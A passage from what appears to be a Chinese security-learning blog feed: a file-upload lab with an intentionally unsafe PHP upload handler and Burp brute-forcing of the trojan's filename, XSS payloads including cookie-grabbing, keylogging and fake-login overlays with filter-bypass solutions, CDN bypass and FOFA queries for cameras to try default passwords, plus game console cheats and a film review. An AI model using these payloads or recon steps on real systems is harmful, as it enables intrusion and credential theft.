value=\u0026#34;提交\u0026#34;/\u0026gt; \u0026lt;/form\u0026gt; 后端：创建test1.php 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;?php if(isset($_POST[\u0026#39;submit\u0026#39;])){ $temp_file = $_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; //取出文件名 $filename1 = $_FILES[\u0026#39;file\u0026#39;][\u0026#39;name\u0026#39;]; //定义一个随机数 $number = rand(1000,9999); $filename2 = $filename1.$number;\t//原文件名和随机数拼接 $filename3 = md5($filename2);\t//将拼接后的内容MD5加密 $filename4 = $filename3.\u0026#39;.php\u0026#39;;\t//加密后的内容加上.php后缀 $img_path = \u0026#34;./pic/\u0026#34;.$filename4; if(move_uploaded_file($temp_file,$img_path)){ echo \u0026#39;success upload\u0026#39;; }else{ echo \u0026#39;fail\u0026#39;; } } ?\u0026gt; 在目录下创建pic文件夹 任务： 上传木马php后，想办法访问到存在于pic中的木马程序。\n方法： 正常上传木马php，在地址栏中访问http://localhost/test/pic/test.php这时会提示404，因为文件名不对，接下来我们启动抓包然后刷新一下这个网页，抓取到了请求。选中数据包第一行的文件名，提交到暴力破解。将假文件名选为爆破位点，像这样：\n1 2 3 4 5 6 7 8 GET /test/pic/§test§.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 DNT: 1 Connection: close Upgrade-Insecure-Requests: 1 在payloads中设置类别为numbers，1000-9999步长为1，下面的Payload Processing先选Add Prefix填写上传的原文件名，再选Hash-MD5，开启攻击。\n原理： 本质就是根据源代码对文件名的处理过程在burp suite中复现这一过程。\n","date":"2026-01-19T20:47:50+08:00","permalink":"https://www.retr0.xyz/p/1.19-xss-%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB2%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","title":"1.19 XSS 注入攻击2与文件上传"},{"content":"xss攻击 示例：网络留言板 示例网站：网络安全演示 - 留言板\nxss攻击，日常弹窗alert()只是我们测试危害的一种方式\nxss攻击的本质，是让人家的浏览器去因为你找到的网站漏洞去运行恶意js代码\n测试弹窗，有很多时候弹窗种类多种多样\n下面是示例注入代码：\njs弹窗 1 \u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt; 基于图片报错弹窗 1 \u0026lt;img src=x onerror=\u0026#34;alert(1)\u0026#34; /\u0026gt; 基于图片报错篡改网页 1 \u0026lt;img src=x onerror=\u0026#34;document.body.innerHTML=\u0026#39;\u0026lt;h1 style=color:red;padding:50px;\u0026gt;haha wocao\u0026lt;/h1\u0026gt;\u0026#39;\u0026#34; /\u0026gt; 基于矢量图网页加载时弹窗 1 \u0026lt;svg onload=\u0026#34;alert(1)\u0026#34; /\u0026gt; 基于iframe容器网页加载时弹窗 1 \u0026lt;iframe onload=\u0026#34;alert(1)\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; 基于iframe容器在网页中加载其他网页 1 \u0026lt;iframe src=\u0026#34;https://www.baidu.com\u0026#34; onload=\u0026#34;alert(1)\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; 鼠标掠过时弹窗 1 \u0026lt;div onmouseover=\u0026#34;alert(1)\u0026#34;\u0026gt;点我抽奖\u0026lt;/div\u0026gt; 基于图片报错弹窗cookie信息 1 \u0026lt;img src=x onerror=\u0026#34;alert(\u0026#39;Cookie: \u0026#39; + document.cookie)\u0026#34;\u0026gt; 基于图片报错的键盘检测 1 \u0026lt;img src=x onerror=\u0026#34;document.addEventListener(\u0026#39;keypress\u0026#39;,function(e){console.log(\u0026#39;按键:\u0026#39;+e.key)});\u0026#34;\u0026gt; 基于图片报错的伪装登录页面 1 \u0026lt;img src=x onerror=\u0026#34;var d=document;d.body.innerHTML=\u0026#39;\u0026lt;div style=position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;display:flex;align-items:center;justify-content:center\u0026gt;\u0026lt;div style=background:white;padding:30px;border-radius:10px;text-align:center\u0026gt;\u0026lt;h2\u0026gt;系统提示\u0026lt;/h2\u0026gt;\u0026lt;p\u0026gt;您的账户存在异常，请重新登录\u0026lt;/p\u0026gt;\u0026lt;input type=text placeholder=用户名 id=u style=margin:10px;padding:10px;width:200px\u0026gt;\u0026lt;input type=password placeholder=密码 id=p style=margin:10px;padding:10px;width:200px\u0026gt;\u0026lt;button onclick=var u=document.getElementById(String.fromCharCode(117));var p=document.getElementById(String.fromCharCode(112));alert(String.fromCharCode(29992,25143,21517,58)+u.value+String.fromCharCode(10,23494,30721,58)+p.value);this.parentElement.parentElement.remove() style=margin:10px;padding:10px 20px;background:#667eea;color:white;border:none;border-radius:5px;cursor:pointer\u0026gt;登录\u0026lt;/button\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;/div\u0026gt;\u0026#39;\u0026#34;\u0026gt; 练习题 链接：练习靶场\n讲解（部分） 0x04 server code：\n1 2 3 4 5 function render (input) { const stripBracketsRe = /[()`]/g input = input.replace(stripBracketsRe, \u0026#39;\u0026#39;) return input } 可以看到服务端对输入的字符串中(、)、 全部进行了删除，所以我们这里要使用html特有的实体编号来代替，因为(、)对应的实体编号分别是40、41，在引用时使用\u0026amp;#编号;`格式\n所以有示例答案：\n1 \u0026lt;img src=x onerror=\u0026#34;alert\u0026amp;#40;1\u0026amp;#41;\u0026#34;\u0026gt; 更多html实体编码请查：HTML ASCII 字符完整对照表\n0x06 server code：\n1 2 3 4 function render (input) { input = input.replace(/auto|on.*=|\u0026gt;/ig, \u0026#39;_\u0026#39;) return `\u0026lt;input value=1 ${input} type=\u0026#34;text\u0026#34;\u0026gt;` } 服务端屏蔽了auto(不论大小写)、on开头=结尾的字符串、\u0026gt;三种元素\n这里我们借助html语言松散的特点\n1 2 onclick =\u0026#34;alert(1)\u0026#34; 点击一下上面的文字1就可以了\n0x08 server code:\n1 2 3 4 5 6 7 8 function render (src) { src = src.replace(/\u0026lt;\\/style\u0026gt;/ig, \u0026#39;/* \\u574F\\u4EBA */\u0026#39;) return ` \u0026lt;style\u0026gt; ${src} \u0026lt;/style\u0026gt; ` } 可以看到服务端对\u0026lt;/style\u0026gt;进行了屏蔽，这里我们利用html的特性把标签拆开\n1 2 3 4 \u0026lt;/style \u0026gt; \u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt; \u0026lt;style\u0026gt; 0x0B server code:\n1 2 3 4 function render (input) { input = input.toUpperCase() return `\u0026lt;h1\u0026gt;${input}\u0026lt;/h1\u0026gt;` } 可以看到服务端把所有小写字母都转为了大写字母，这里我们利用js函数大小写敏感但是html标签大小写不敏感的特性，从外部调用js代码，我们新建一个abc.js文件，写入alert(1);将文件放在phpstudy的网页根目录，\n1 \u0026lt;/h1\u0026gt;\u0026lt;script src=\u0026#34;http://127.0.0.1/abc.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;h1\u0026gt; 0x0D server code:\n1 2 3 4 5 6 7 8 function render (input) { input = input.replace(/[\u0026lt;/\u0026#34;\u0026#39;]/g, \u0026#39;\u0026#39;) return ` \u0026lt;script\u0026gt; // alert(\u0026#39;${input}\u0026#39;) \u0026lt;/script\u0026gt; ` } 注意到服务端屏蔽了\u0026lt;/\u0026quot;',并且文本被放在一个很尴尬的位置：\n1 2 3 \u0026lt;script\u0026gt; // alert(\u0026#39;文本在这里\u0026#39;) \u0026lt;/script\u0026gt; 所以我们先换行逃出注释，再写出alert(1)的主函数，最后用--\u0026gt;来屏蔽后边剩余的')\n0x0F server code:\n1 2 3 4 5 6 7 8 9 10 11 function render (input) { function escapeHtml(s) { return s.replace(/\u0026amp;/g, \u0026#39;\u0026amp;amp;\u0026#39;) .replace(/\u0026#39;/g, \u0026#39;\u0026amp;#39;\u0026#39;) .replace(/\u0026#34;/g, \u0026#39;\u0026amp;quot;\u0026#39;) .replace(/\u0026lt;/g, \u0026#39;\u0026amp;lt;\u0026#39;) .replace(/\u0026gt;/g, \u0026#39;\u0026amp;gt;\u0026#39;) .replace(/\\//g, \u0026#39;\u0026amp;#x2f;\u0026#39;) } return `\u0026lt;img src onerror=\u0026#34;console.error(\u0026#39;${escapeHtml(input)}\u0026#39;)\u0026#34;\u0026gt;` } 服务端伪屏蔽（将字符转为了html实体编号，不影响计算机读取）了很多字符，这里我们正常操作将可以闭合的部分闭合，不同元素之间用;断开，注意利用//注释掉不必要的部分\n1 2 3 \u0026#39; );alert(1)// 屏蔽前长这样\u0026lt;img src onerror=\u0026#34;console.error(\u0026#39;\u0026#39; );alert(1)//\u0026#39;)\u0026#34;\u0026gt; 0x12 server code:\n1 2 3 4 5 // from alf.nu function escape (s) { s = s.replace(/\u0026#34;/g, \u0026#39;\\\\\u0026#34;\u0026#39;) return \u0026#39;\u0026lt;script\u0026gt;console.log(\u0026#34;\u0026#39; + s + \u0026#39;\u0026#34;);\u0026lt;/script\u0026gt;\u0026#39; } 这里针对\u0026quot;进行了屏蔽：将\u0026quot;替换为\\\u0026quot;，也就是变为普通引号，先重点在于将前面的(\u0026quot;闭合，将\\加再替换后的\u0026quot;，也就是\\\u0026quot;前就会使对引号的转义失效(\\\\\u0026quot;结构)，从而成功闭合\n1 21\\\u0026#34;);alert(1)\u0026lt;/script\u0026gt; 填入后长这样\u0026lt;script\u0026gt;console.log(\u0026quot;21\\\\\u0026quot;);alert(1)\u0026lt;/script\u0026gt;\u0026quot;);\u0026lt;/script\u0026gt;\n","date":"2026-01-18T20:42:00+08:00","permalink":"https://www.retr0.xyz/p/1.18-xss%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/","title":"1.18 XSS注入攻击"},{"content":"‼️引用时记得删去[] ,引用格式\u0026amp;#编号;\nHTML 实体（\u0026amp;#编号;） 十进制编码 字符 字符描述 \u0026amp;#[0]; 0 [控制字符] 空字符 (NULL) \u0026amp;#[1]; 1 [控制字符] 标题开始 (SOH) \u0026amp;#[2]; 2 [控制字符] 文本开始 (STX) \u0026amp;#[3]; 3 [控制字符] 文本结束 (ETX) \u0026amp;#[4]; 4 [控制字符] 传输结束 (EOT) \u0026amp;#[5]; 5 [控制字符] 查询 (ENQ) \u0026amp;#[6]; 6 [控制字符] 确认 (ACK) \u0026amp;#[7]; 7 [控制字符] 响铃 (BEL) \u0026amp;#[8]; 8 [控制字符] 退格 (BS) \u0026amp;#[9]; 9 [控制字符] 水平制表符 (TAB) \u0026amp;#[10]; 10 [控制字符] 换行 (LF) \u0026amp;#[11]; 11 [控制字符] 垂直制表符 (VT) \u0026amp;#[12]; 12 [控制字符] 换页 (FF) \u0026amp;#[13]; 13 [控制字符] 回车 (CR) \u0026amp;#[14]; 14 [控制字符] 移出 (SO) \u0026amp;#[15]; 15 [控制字符] 移入 (SI) \u0026amp;#[16]; 16 [控制字符] 数据链转义 (DLE) \u0026amp;#[17]; 17 [控制字符] 设备控制 1 (DC1) \u0026amp;#[18]; 18 [控制字符] 设备控制 2 (DC2) \u0026amp;#[19]; 19 [控制字符] 设备控制 3 (DC3) \u0026amp;#[20]; 20 [控制字符] 设备控制 4 (DC4) \u0026amp;#[21]; 21 [控制字符] 否定确认 (NAK) \u0026amp;#[22]; 22 [控制字符] 同步空闲 (SYN) \u0026amp;#[23]; 23 [控制字符] 传输块结束 (ETB) \u0026amp;#[24]; 24 [控制字符] 取消 (CAN) \u0026amp;#[25]; 25 [控制字符] 介质结束 (EM) \u0026amp;#[26]; 26 [控制字符] 替换 (SUB) \u0026amp;#[27]; 27 [控制字符] 转义 (ESC) \u0026amp;#[28]; 28 [控制字符] 文件分隔符 (FS) \u0026amp;#[29]; 29 [控制字符] 组分隔符 (GS) \u0026amp;#[30]; 30 [控制字符] 记录分隔符 (RS) \u0026amp;#[31]; 31 [控制字符] 单元分隔符 (US) \u0026amp;#[32]; 32 （空格） 空格 (Space) \u0026amp;#[33]; 33 ! 感叹号 \u0026amp;#[34]; 34 \u0026quot; 双引号 \u0026amp;#[35]; 35 # 井号 \u0026amp;#[36]; 36 $ 美元符 \u0026amp;#[37]; 37 % 百分号 \u0026amp;#[38]; 38 \u0026amp; 和号 \u0026amp;#[39]; 39 ' 单引号 \u0026amp;#[40]; 40 ( 左括号 \u0026amp;#[41]; 41 ) 右括号 \u0026amp;#[42]; 42 * 星号 \u0026amp;#[43]; 43 + 加号 \u0026amp;#[44]; 44 , 逗号 \u0026amp;#[45]; 45 - 减号 / 连字符 \u0026amp;#[46]; 46 . 句点 / 小数点 \u0026amp;#[47]; 47 / 斜杠 \u0026amp;#[48]; 48 0 数字 0 \u0026amp;#[49]; 49 1 数字 1 \u0026amp;#[50]; 50 2 数字 2 \u0026amp;#[51]; 51 3 数字 3 \u0026amp;#[52]; 52 4 数字 4 \u0026amp;#[53]; 53 5 数字 5 \u0026amp;#[54]; 54 6 数字 6 \u0026amp;#[55]; 55 7 数字 7 \u0026amp;#[56]; 56 8 数字 8 \u0026amp;#[57]; 57 9 数字 9 \u0026amp;#[58]; 58 : 冒号 \u0026amp;#[59]; 59 ; 分号 \u0026amp;#[60]; 60 \u0026lt; 小于号 \u0026amp;#[61]; 61 = 等号 \u0026amp;#[62]; 62 \u0026gt; 大于号 \u0026amp;#[63]; 63 ? 问号 \u0026amp;#[64]; 64 @ @符号 \u0026amp;#[65]; 65 A 大写 A \u0026amp;#[66]; 66 B 大写 B \u0026amp;#[67]; 67 C 大写 C \u0026amp;#[68]; 68 D 大写 D \u0026amp;#[69]; 69 E 大写 E \u0026amp;#[70]; 70 F 大写 F \u0026amp;#[71]; 71 G 大写 G \u0026amp;#[72]; 72 H 大写 H \u0026amp;#[73]; 73 I 大写 I \u0026amp;#[74]; 74 J 大写 J \u0026amp;#[75]; 75 K 大写 K \u0026amp;#[76]; 76 L 大写 L \u0026amp;#[77]; 77 M 大写 M \u0026amp;#[78]; 78 N 大写 N \u0026amp;#[79]; 79 O 大写 O \u0026amp;#[80]; 80 P 大写 P \u0026amp;#[81]; 81 Q 大写 Q \u0026amp;#[82]; 82 R 大写 R \u0026amp;#[83]; 83 S 大写 S \u0026amp;#[84]; 84 T 大写 T \u0026amp;#[85]; 85 U 大写 U \u0026amp;#[86]; 86 V 大写 V \u0026amp;#[87]; 87 W 大写 W \u0026amp;#[88]; 88 X 大写 X \u0026amp;#[89]; 89 Y 大写 Y \u0026amp;#[90]; 90 Z 大写 Z \u0026amp;#[91]; 91 [ 左方括号 \u0026amp;#[92]; 92 \\ 反斜杠 \u0026amp;#[93]; 93 ] 右方括号 \u0026amp;#[94]; 94 ^ 脱字符 \u0026amp;#[95]; 95 _ 下划线 \u0026amp;#[96]; 96 ` 反引号 \u0026amp;#[97]; 97 a 小写 a \u0026amp;#[98]; 98 b 小写 b \u0026amp;#[99]; 99 c 小写 c \u0026amp;#[100]; 100 d 小写 d \u0026amp;#[101]; 101 e 小写 e \u0026amp;#[102]; 102 f 小写 f \u0026amp;#[103]; 103 g 小写 g \u0026amp;#[104]; 104 h 小写 h \u0026amp;#[105]; 105 i 小写 i \u0026amp;#[106]; 106 j 小写 j \u0026amp;#[107]; 107 k 小写 k \u0026amp;#[108]; 108 l 小写 l \u0026amp;#[109]; 109 m 小写 m \u0026amp;#[110]; 110 n 小写 n \u0026amp;#[111]; 111 o 小写 o \u0026amp;#[112]; 112 p 小写 p \u0026amp;#[113]; 113 q 小写 q \u0026amp;#[114]; 114 r 小写 r \u0026amp;#[115]; 115 s 小写 s \u0026amp;#[116]; 116 t 小写 t \u0026amp;#[117]; 117 u 小写 u \u0026amp;#[118]; 118 v 小写 v \u0026amp;#[119]; 119 w 小写 w \u0026amp;#[120]; 120 x 小写 x \u0026amp;#[121]; 121 y 小写 y \u0026amp;#[122]; 122 z 小写 z \u0026amp;#[123]; 123 { 左大括号 \u0026amp;#[124]; 124 | 竖线 \u0026amp;#[125]; 125 } 右大括号 \u0026amp;#[126]; 126 ~ 波浪号 \u0026amp;#[127]; 127 [控制字符] 删除 (DEL) ","date":"2026-01-18T13:52:26+08:00","permalink":"https://www.retr0.xyz/p/html-ascii-%E5%AD%97%E7%AC%A6%E5%AE%8C%E6%95%B4%E5%AF%B9%E7%85%A7%E8%A1%A8/","title":"HTML ASCII 字符完整对照表"},{"content":"基于页游的前端分析 Google小恐龙 链接：T-Rex 在线版的chrome恐龙游戏\nF12打开开发者模式，选择控制台Console，输入：\n关闭GameOver判定：Runner.prototype.gameOver = function(){}\n调整速度：Runner.instance_.setSpeed(1000);\n2048 链接：2048\nF12打开开发者模式，选择应用程序Application\n在本地存储Local Storage中可以看到存储在本地的游戏数据，例如：\n1 {\u0026#34;grid\u0026#34;:{\u0026#34;size\u0026#34;:4,\u0026#34;cells\u0026#34;:[[null,null,null,{\u0026#34;position\u0026#34;:{\u0026#34;x\u0026#34;:0,\u0026#34;y\u0026#34;:3},\u0026#34;value\u0026#34;:2}],[null,null,null,null],[{\u0026#34;position\u0026#34;:{\u0026#34;x\u0026#34;:2,\u0026#34;y\u0026#34;:0},\u0026#34;value\u0026#34;:4},null,null,null],[null,null,null,null]]},\u0026#34;score\u0026#34;:0,\u0026#34;over\u0026#34;:false,\u0026#34;won\u0026#34;:false,\u0026#34;keepPlaying\u0026#34;:false} 通过修改即可改变棋盘中的数字。\n数独 链接：数独游戏 – 信息安全教学示例（随机题目）\n右键检查源代码可以发现网页生成题目并渲染的逻辑。\n1 2 3 4 5 6 7 8 9 10 11 12 const { puzzle, solution } = generatePuzzle(); //创建一个style（css）放到网页里命名为secretStyle const secretStyle = document.createElement(\u0026#39;style\u0026#39;); //secretStyle的css里放题目答案，不予显示 secretStyle.textContent = `body::before{content:\u0026#34;${solution.join(\u0026#39;\u0026#39;)}\u0026#34;;display:none}`; //网页头部增加答案 document.head.appendChild(secretStyle); //右键，查看源码看的是网页真实源码，不渲染 //elements里面是实时渲染的网页 最终在F12开发者模式的元素Elements中发现第二个\u0026lt;style\u0026gt;中有题目答案：\n1 body::before{content:\u0026#34;789145263364729851215386479821593647576418932493672185957861324632954718148237596\u0026#34;;display:none} 所以我们打开控制台执行：\n1 2 3 4 5 6 7 8 9 //显示body::before的答案 const hidden = getComputedStyle(document.body,\u0026#39;::before\u0026#39;).content.replace(/\\\u0026#34;/g,\u0026#39;\u0026#39;); const digits = hidden.split(\u0026#39;\u0026#39;).map(Number); console.log(digits); //让答案显示在棋盘上 document.querySelectorAll(\u0026#39;.cell\u0026#39;).forEach((cell,i)=\u0026gt;{ if(!cell.disabled) cell.value = digits[i]; }); flappybird 链接：Floppy Bird\nF12打开开发者模式，选择控制台Console，输入：\n展示当前窗口的所有参数 console.log(window)\n参考：\n调整重力 gravity = 0.01\n管道间距（依然有攻击判定） flyArea = 100\n鸟跳的多高 jump = -4.6\n管道真实高度 pipeheight = 200\n修改best的分数 highscore = 999\n玩家死亡 playerDead = function(){}\n塔防 链接：HTML5 Tower Defense\n右键检查源代码，发现游戏算法引入\n1 \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;td-pkg-zh-min.js?_t=1293962401.7\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 打开td-pkg-zh-min.js文件，发现设计师有提到cheat success!推测是设计师留下的秘籍。\n进一步找到_TD.cheat=\u0026quot;money+\u0026quot;，推测出后面是要写内容的。\n在控制台输入_TD.cheat=\u0026quot;money+\u0026quot;，发现金钱增加。\n扫雷 链接：经典扫雷 (教学版)\n右键检查源代码，发现整个棋盘为grid二维数组，二维数组内部嵌入字典，字典里面有isMine判断是不是地雷\n因此在控制台使用输入下面的代码：\n1 2 3 4 5 6 7 8 grid.forEach(row =\u0026gt; { row.forEach(cell =\u0026gt; { if (cell.isMine) { // 直接修改 DOM 样式 cell.element.style.backgroundColor = \u0026#39;red\u0026#39;; } }); }); 俄罗斯方块 链接：Tetris: Cyberpunk Edition\n目标： 修改所有下落方块变为\u0026quot;L\u0026quot;形\n右键检查源代码，发现生成下一个方块所用的随机函数：\n1 2 3 4 5 6 7 8 9 createPiece: function(type) { if (type === \u0026#39;I\u0026#39;) return [[0, 1, 0, 0],[0, 1, 0, 0],[0, 1, 0, 0],[0, 1, 0, 0]]; if (type === \u0026#39;L\u0026#39;) return [[0, 2, 0],[0, 2, 0],[0, 2, 2]]; if (type === \u0026#39;J\u0026#39;) return [[0, 3, 0],[0, 3, 0],[3, 3, 0]]; if (type === \u0026#39;O\u0026#39;) return [[4, 4],[4, 4]]; if (type === \u0026#39;Z\u0026#39;) return [[5, 5, 0],[0, 5, 5],[0, 0, 0]]; if (type === \u0026#39;S\u0026#39;) return [[0, 6, 6],[6, 6, 0],[0, 0, 0]]; if (type === \u0026#39;T\u0026#39;) return [[0, 7, 0],[7, 7, 7],[0, 0, 0]]; }, 因此需要修改上面的函数，去掉所有if，直接return\u0026quot;I\u0026quot;时的结果，\n接下来console.log(window)查看网页参数，发现createPiece为Tetris的一个子参数，所以调用时要写全参数名为Tetris.createPiece，\n在控制台输入下面代码将参数修改，注意使用=将参数赋值：\n1 2 3 Tetris.createPiece=function(type) { return [[0, 1, 0, 0],[0, 1, 0, 0],[0, 1, 0, 0],[0, 1, 0, 0]]; } 打砖块 链接：CYBER ARKANOID 3077\nconsole.log(window)查看网页参数\n思路一：Game.paddle.width = 800;修改挡板宽度\n思路二： 每10ms获取一次球的x坐标，并设置挡板坐标中心始终对准小球\n1 2 3 setInterval(()=\u0026gt;{ Game.paddle.x = Game.ball.x - Game.paddle.width / 2; },10) 贪吃蛇 链接：贪吃蛇 (自动加速版)\n使用AI生成的外挂代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 // 1. 备份原函数 if (!SnakeGame.originalUpdate) { SnakeGame.originalUpdate = SnakeGame.update; } // --- 辅助函数：泛洪算法 (计算某一点周围有多少空地) --- // 这是一个简化版 BFS (广度优先搜索) SnakeGame.countFreeSpace = function(startX, startY, maxCheck) { let queue = [{x: startX, y: startY}]; let visited = new Set(); visited.add(startX + \u0026#39;,\u0026#39; + startY); let count = 0; // 为了性能，我们不需要计算整个地图，只要空间大于蛇的长度就认为安全 while (queue.length \u0026gt; 0 \u0026amp;\u0026amp; count \u0026lt; maxCheck) { let p = queue.shift(); count++; let dirs = [{x:0, y:-1}, {x:0, y:1}, {x:-1, y:0}, {x:1, y:0}]; for (let d of dirs) { let nx = p.x + d.x; let ny = p.y + d.y; let key = nx + \u0026#39;,\u0026#39; + ny; // 检查边界 if (nx \u0026lt; 0 || nx \u0026gt;= this.tileCount || ny \u0026lt; 0 || ny \u0026gt;= this.tileCount) continue; // 检查是否撞到蛇身 (注意：这里要模拟蛇尾移动后的状态，简单起见直接用当前身体) let isBody = false; for(let bodyPart of this.snake) { if (bodyPart.x === nx \u0026amp;\u0026amp; bodyPart.y === ny) { isBody = true; break; } } if (!isBody \u0026amp;\u0026amp; !visited.has(key)) { visited.add(key); queue.push({x: nx, y: ny}); } } } return count; }; // 2. 重写更新逻辑 SnakeGame.update = function() { let head = this.snake[0]; let food = this.food; let moves = [ {x: 0, y: -1}, {x: 0, y: 1}, {x: -1, y: 0}, {x: 1, y: 0} ]; // --- 第一步：获取所有不立刻撞死的方向 --- let validMoves = moves.filter(move =\u0026gt; { let nextPos = {x: head.x + move.x, y: head.y + move.y}; // 撞墙/撞自己检测 if (this.checkCollision(nextPos)) return false; // 反向掉头检测 if (move.x === -this.velocity.x \u0026amp;\u0026amp; move.y === -this.velocity.y) return false; return true; }); // --- 第二步：给每个方向打分 --- // 评分标准：距离食物越近越好，但前提是空间必须足够 let bestMove = null; let maxSpace = -1; let minDist = Infinity; // 如果没有可行方向，就只能等死了，保持原速 if (validMoves.length \u0026gt; 0) { // 遍历所有可行方向 validMoves.forEach(move =\u0026gt; { let nextPos = {x: head.x + move.x, y: head.y + move.y}; // 1. 计算该方向的“生存空间” // 我们只需要检测空间是否大于蛇的长度。如果空间 \u0026gt; 蛇长，说明进去后能转得开 let space = this.countFreeSpace(nextPos.x, nextPos.y, this.snake.length + 5); // 2. 计算距离食物的距离 let dist = Math.abs(nextPos.x - food.x) + Math.abs(nextPos.y - food.y); move.score = 0; move.space = space; move.dist = dist; }); // --- 决策逻辑 --- // 策略 A: 优先找“空间充足”且“距离最近”的路 // 过滤掉那些空间极其狭窄的死胡同 (空间 \u0026lt; 蛇身长度) let safeMoves = validMoves.filter(m =\u0026gt; m.space \u0026gt; this.snake.length); if (safeMoves.length \u0026gt; 0) { // 如果有安全的路，选离食物最近的 safeMoves.sort((a, b) =\u0026gt; a.dist - b.dist); bestMove = safeMoves[0]; } else { // 策略 B: 如果所有路都是死胡同（或者空间都不够）， // 此时不要管食物了！选一个空间最大的方向苟延残喘，等待尾巴空出位置。 validMoves.sort((a, b) =\u0026gt; b.space - a.space); bestMove = validMoves[0]; } this.velocity = bestMove; } // 执行原始逻辑 this.originalUpdate(); }; 查找真IP CDN功能： 缓存和保护网站\n因为cdn服务架构简单，所以几乎绝对防御，但是防不住ddos\n如何绕过cdn？\nhttp://cdn.chinaz.com/\nhttps://ping.chinaz.com/\n如果目标网站出现的ip都是不一样，说明使用了cdn\n考虑使用冷门ip，因为这些第三世界国家可能没有cdn\ndns查询\nhttps://dnsdb.io/zh-cn/\n微步在线\nhttps://x.threatbook.cn/\ndns和ip查询\nhttp://viewdns.info/\ntracert www.cctv.com\n追踪去目标经历了多少跳，把数据包ttl调整为1，2，3，4.。。。。。直到目标位置，此时可以看到每个处理这个数据包的路由器ip地址是什么\n中途会发现有的路由器不给你显示ip地址（骨干路由器，做了ip屏蔽不给外人显示ip）\nping人的时候TTL=64 TTL指time to live\n使用邮件，pop3 smtp有概率可以看到cdn背后的目标\n点击显示邮件原文绕过cloudflare\n全网扫ip\nhttps://github.com/superfish9/hackcdn\nhttps://github.com/boy-hack/w8fuckcdn\nhost修改\n确定目标本尊ip之后，需要修改自己电脑的host文件才能正确攻击\nC:\\Windows\\System32\\drivers\\etc\\hosts\n电脑解析ip地址优先解析hosts文件\n网络空间搜索引擎 https://fofa.info/\nbody=\u0026quot;发送验证码\u0026quot; \u0026amp;\u0026amp; country=\u0026quot;CN\u0026quot;\n查找网页中包含“发送验证码”，且位于中国的网站\napp=\u0026quot;CCTV-Cameras\u0026quot;\n查找监控摄像头，根据找到的目标特征，去搜索默认密码\nport=\u0026quot;80\u0026quot;\n只搜索某个端口\nregion=\u0026quot;Zhejiang\u0026quot; \u0026amp;\u0026amp; host=\u0026quot;gov.cn\u0026quot; \u0026amp;\u0026amp; city=\u0026quot;Hangzhou\u0026quot;\n限定地区进行信息搜集\n","date":"2026-01-17T20:36:48+08:00","permalink":"https://www.retr0.xyz/p/1.17-%E9%A1%B5%E6%B8%B8%E4%BD%9C%E5%BC%8A%E5%92%8C%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/","title":"1.17 页游作弊和信息搜集"},{"content":"当 300 公里时速的赛车撕裂银幕，汉斯・季默的配乐与引擎轰鸣共振，《F1：狂飙飞车》用教科书级的工业水准证明：电影院从未失去存在的意义。这部实拍为魂的赛车大片，不仅是一场感官狂欢，更给近年疲软的好莱坞打了一剂强心针。\n影片的拍摄堪称突破，制作团队深入真实 F1 大奖赛现场实拍，90% 赛道镜头无需 CG 加持，IMAX 特制摄影机捕捉的超车瞬间，让轮胎摩擦的灼热感、气流的湍流轨迹都近在眼前。汉斯・季默操刀的配乐更是神来之笔，电子节拍与弦乐交织，和引擎转速完美同步，形成直击心脏的音画共振。\n可惜的是，我所在的小县城没有 IMAX 影院，市区又太远，最终没能体验到 IMAX 版本的沉浸感，如今想来满是遗憾 —— 这种视听融合的极致冲击，小屏幕根本无法复刻，电影院的超大画幅与精准声场，才是这部影片的唯一打开方式。\n另外，在 IP 续集泛滥、特效堆砌的当下，《F1：狂飙飞车》重拾了好莱坞大片的核心基因。导演延续实拍执念，主演历经数月赛车特训，七届 F1 冠军汉密尔顿把控专业细节，从 2.9 秒换胎的精密协作到赛道策略博弈，每个镜头都透着对专业的敬畏。\n相较于同期口碑滑坡的好莱坞作品，这部原创影片不靠 IP 光环，仅凭扎实的制作与教科书级的好莱坞叙事，让观众重温了好莱坞黄金时代的大片质感。\n或许影片在剧情深度上仍有提升空间，但它用视听革新与创作诚意，重新定义了 “影院大片” 的价值。走进影院，才能真正感受这场速度与工业的双重狂欢。\n","date":"2026-01-15T20:05:19+08:00","image":"https://free.picui.cn/free/2026/01/15/6968d7381bb55.jpg","permalink":"https://www.retr0.xyz/p/%E5%BD%B1%E8%A7%86%E7%9F%AD%E8%AF%84f1%E7%8B%82%E9%A3%99%E9%A3%9E%E8%BD%A67/10%E6%9E%81%E8%87%B4%E7%9A%84%E8%A7%86%E5%90%AC%E4%BA%AB%E5%8F%97/","title":"[影视短评]《F1：狂飙飞车》7/10：极致的视听享受！"},{"content":" 因为篇幅原因这里仅按考纲作分类列举，之后有机会会带来各个库详细的使用教程。\n网络爬虫类 库名 描述 requests 简洁且简单处理 HTTP 请求 scrapy Web 获取框架，一个半成品爬虫 数据处理 库名 描述 numpy 科学计算库 scipy 在 numpy 基础上增加了很多库函数 pandas 数据处理、数据分析 文本处理 库名 描述 pdfminer 读取 pdf 